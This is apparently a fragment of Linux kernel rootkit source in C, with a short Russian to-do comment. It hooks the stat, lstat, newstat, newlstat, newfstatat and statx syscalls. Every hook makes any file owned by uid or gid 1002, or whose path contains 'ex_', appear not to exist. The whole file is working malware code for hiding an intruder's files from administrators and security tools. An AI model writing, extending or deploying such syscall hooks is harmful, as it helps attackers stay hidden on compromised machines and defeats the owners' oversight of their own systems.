/*
    скрывает по uid gid и подстроке
    не скрывает по pid

    вывести повтор код в отдельную функцию
*/


static asmlinkage long ex_sys_stat(struct pt_regs *regs)
{
    long ret = real_sys_stat(regs);

    if (ret < 0) {
        return ret;
    }

    char pathname[256];
    struct stat *statbuf = (struct stat *)regs->si;
    struct stat *kstatbuf;

    kstatbuf = kzalloc(sizeof(struct stat), GFP_KERNEL);
    if (kstatbuf == NULL) {
        return ret;
    }

    if (copy_from_user(kstatbuf, statbuf, sizeof(struct stat))) {
        goto out;
    }

    if (copy_from_user(pathname, (char *)regs->di, strnlen_user((char *)regs->di, 256))) {
        goto out;
    }
    pathname[sizeof(pathname) - 1] = '\0'; 

    if (kstatbuf->st_uid == 1002 || kstatbuf->st_gid == 1002 || 
        strstr(pathname, "ex_")) {
        ret = -ENOENT;
    }

out:
    kfree(kstatbuf);
    return ret;
}

static asmlinkage long ex_sys_lstat(struct pt_regs *regs)
{
    long ret = real_sys_lstat(regs);

    if (ret < 0) {
        return ret;
    }

    char pathname[256];
    struct stat *statbuf = (struct stat *)regs->si;
    struct stat *kstatbuf;

    kstatbuf = kzalloc(sizeof(struct stat), GFP_KERNEL);
    if (kstatbuf == NULL) {
        return ret;
    }

    if (copy_from_user(kstatbuf, statbuf, sizeof(struct stat))) {
        goto out;
    }

    if (copy_from_user(pathname, (char *)regs->di, strnlen_user((char *)regs->di, 256))) {
        goto out;
    }
    pathname[sizeof(pathname) - 1] = '\0'; 

    if (kstatbuf->st_uid == 1002 || kstatbuf->st_gid == 1002 || 
        strstr(pathname, "ex_")) {
        ret = -ENOENT;
    }

out:
    kfree(kstatbuf);
    return ret;
}

static asmlinkage long ex_sys_newstat(struct pt_regs *regs)
{
    long ret = real_sys_newstat(regs);
    
    if (ret < 0) {
        return ret;
    }
    
    char pathname[256];
    struct stat *statbuf = (struct stat *)regs->si;
    struct stat *kstatbuf;

    kstatbuf = kzalloc(sizeof(struct stat), GFP_KERNEL);
    if (kstatbuf == NULL) {
        return ret;
    }

    if (copy_from_user(kstatbuf, statbuf, sizeof(struct stat))) {
        goto out;
    }

    if (copy_from_user(pathname, (char *)regs->di, strnlen_user((char *)regs->di, 256))) {
        goto out;
    }
    pathname[sizeof(pathname) - 1] = '\0'; 

    if (kstatbuf->st_uid == 1002 || kstatbuf->st_gid == 1002 || 
        strstr(pathname, "ex_")) {
        ret = -ENOENT;
    }

out:
    kfree(kstatbuf);
    return ret;
}

static asmlinkage long ex_sys_newlstat(struct pt_regs *regs)
{
    long ret = real_sys_newlstat(regs);
    
    if (ret < 0) {
        return ret;
    }
    
    char pathname[256];
    struct stat *statbuf = (struct stat *)regs->si;
    struct stat *kstatbuf;

    kstatbuf = kzalloc(sizeof(struct stat), GFP_KERNEL);
    if (kstatbuf == NULL) {
        return ret;
    }

    if (copy_from_user(kstatbuf, statbuf, sizeof(struct stat))) {
        goto out;
    }

    if (copy_from_user(pathname, (char *)regs->di, strnlen_user((char *)regs->di, 256))) {
        goto out;
    }
    pathname[sizeof(pathname) - 1] = '\0'; 

    if (kstatbuf->st_uid == 1002 || kstatbuf->st_gid == 1002 || 
        strstr(pathname, "ex_")) {
        ret = -ENOENT;
    }

out:
    kfree(kstatbuf);
    return ret;
}


static asmlinkage long ex_sys_newfstatat(struct pt_regs *regs)
{
    long ret = real_sys_newfstatat(regs);
    udelay(300);
    if (ret < 0) {
        return ret;
    }

    char pathname[256];
    struct stat *statbuf = (struct stat *)regs->dx;
    struct stat *kstatbuf;

    kstatbuf = kzalloc(sizeof(struct stat), GFP_KERNEL);
    if (kstatbuf == NULL) {
        return ret;
    }

    if (copy_from_user(kstatbuf, statbuf, sizeof(struct stat))) {
        goto out;
    }

    if (copy_from_user(pathname, (char *)regs->si, strnlen_user((char *)regs->si, 256))) {
        goto out;
    }
    pathname[sizeof(pathname) - 1] = '\0'; 

    if (kstatbuf->st_uid == 1002 || kstatbuf->st_gid == 1002 || 
        strstr(pathname, "ex_")) {
        ret = -ENOENT;
    }

out:
    kfree(kstatbuf);
    return ret;
}


static asmlinkage long ex_sys_statx(struct pt_regs *regs)
{
    long ret = real_sys_statx(regs);

    if (ret < 0) {
        return ret;
    }

    char pathname[256];
    struct statx *statxbuf = (struct statx *)regs->r8;
    struct statx *kstatxbuf;

    kstatxbuf = kzalloc(sizeof(struct statx), GFP_KERNEL);
    if (kstatxbuf == NULL) {
        return ret;
    }

    if (copy_from_user(kstatxbuf, statxbuf, sizeof(struct statx))) {
        goto out;
    }

    if (copy_from_user(pathname, (char *)regs->si, strnlen_user((char *)regs->si, 256))) {
        goto out;
    }
    pathname[sizeof(pathname) - 1] = '\0'; 

    if (kstatxbuf->stx_uid == 1002 || kstatxbuf->stx_gid == 1002 || 
        strstr(pathname, "ex_")) {
        ret = -ENOENT;
    }

out:
    kfree(kstatxbuf);
    return ret;
}

